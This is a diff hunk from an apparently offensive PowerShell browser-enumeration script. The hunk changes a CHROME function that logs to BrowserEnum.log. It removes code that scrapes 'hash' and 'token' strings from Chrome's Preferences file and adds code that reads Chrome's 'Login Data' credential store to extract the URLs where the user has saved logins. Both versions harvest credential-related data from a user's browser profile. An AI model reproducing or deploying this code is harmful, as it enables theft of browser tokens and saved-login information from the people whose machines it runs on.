@@ -758,17 +758,16 @@ function CHROME {
             }
         }
 
-        ## Retrieve Chrome (Tokens|Hashs)
-        echo "`n`nChrome Hashs|Tokens" >> $LogFilePath\BrowserEnum.log
-        echo "-------------------" >> $LogFilePath\BrowserEnum.log
-        If(-not(Test-Path -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences")){
-            echo "{Could not find any Hashs|Tokens}" >> $LogFilePath\BrowserEnum.log
+        ## Retrieve Chrome URL logins
+        echo "`nEnumerating LogIns" >> $LogFilePath\BrowserEnum.log
+        echo "------------------" >> $LogFilePath\BrowserEnum.log
+        If(-not(Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data")){
+            echo "{None Credentials found}" >> $LogFilePath\BrowserEnum.log
         }else{
-            $Preferencies_Path = Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
-            $Parse_String = $Preferencies_Path.split(",");$Find_MyHashes = $Parse_String|Select-String -pattern "hash","token"
-            $BadChars = $Find_MyHashes -replace '"','' -replace '{','' -replace '\[','' -replace '}','' -replace '\]',''
-            $Dump_Key_Hash = $BadChars|Select-String -pattern '[=]$' # Regex to match the last char '=' of the string.
-            echo $Dump_Key_Hash >> $LogFilePath\BrowserEnum.log
+            $ReadData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+            $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+            $Json = Get-Content -Path "$ReadData"|Select-String -AllMatches $Regex |% {($_.Matches).Value} |Sort -Unique
+            echo $Json >> $LogFilePath\BrowserEnum.log
         }
 }
 
